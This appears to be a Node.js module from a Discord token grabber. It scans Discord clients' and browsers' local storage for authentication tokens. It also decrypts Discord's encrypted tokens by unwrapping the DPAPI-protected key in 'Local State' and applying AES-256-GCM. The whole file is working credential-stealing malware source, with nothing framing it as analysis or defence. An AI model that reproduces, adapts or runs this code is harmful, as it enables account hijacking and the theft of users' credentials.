const fs = require("fs");
const crypto = require("crypto");
const path = require("path");
const aurita = require("win-dpapi");

const cords = [
    "discord",
    "discordDevelopment",
    "discordcanary",
    "discordptb",
    "lightcord"
];

const tokens = [];

async function get_tokens(p) {
    let tail = p;
    p = path.join(p, "Local Storage/leveldb");

    if (!cords.some(d => tail.includes(d))) {
        try {
            const files = await fs.promises.readdir(p);

            for (const file of files) {
                const c = await fs.promises.readFile(path.join(p, file), "utf8");
                [
                    /mfa\.[\w-]{84}/g,
                    /[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm,
                    /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g
                ].forEach(r => {
                    const m = c.match(r);

                    if (m) {
                        m.forEach((tkn) => {
                            if (!tokens.includes(tkn)) {
                                return tokens.push(`browsers_tokens_${tkn}`);
                            }
                        });
                    }
                });
            }
        } catch (e) {
        }
    } else {
        let q = path.join(tail, "Local State");

        if (fs.existsSync(q)) {
            try {
                fs.readdirSync(p).forEach(f => {
                    if (f.endsWith(".log") || f.endsWith(".ldb")) {
                        fs.readFileSync(path.join(p, f), "utf8").split(/\r?\n/).forEach(l => {
                            let m = l.match(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);

                            if (m) {
                                m.forEach(tkn => {
                                    let enc = Buffer.from(JSON.parse(fs.readFileSync(q)).os_crypt.encrypted_key, "base64").slice(5),
                                        key = aurita.unprotectData(Buffer.from(enc, "utf-8"), null, "CurrentUser"),
                                        tkns = Buffer.from(tkn.split("dQw4w9WgXcQ:")[1], "base64"),
                                        run = tkns.slice(3, 15),
                                        mid = tkns.slice(15, tkns.length - 16),
                                        decyph = crypto.createDecipheriv("aes-256-gcm", key, run);

                                    decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));

                                    let out = decyph.update(mid, "base64", "utf-8") + decyph.final("utf-8");

                                    if (!tokens.includes(out)) {
                                        return tokens.push(out);
                                    }
                                });
                            }
                        });
                    }
                });
            } catch (e) {
            }
        }
    }
    return tokens;
}

module.exports = {
    tokens,
    get_tokens
}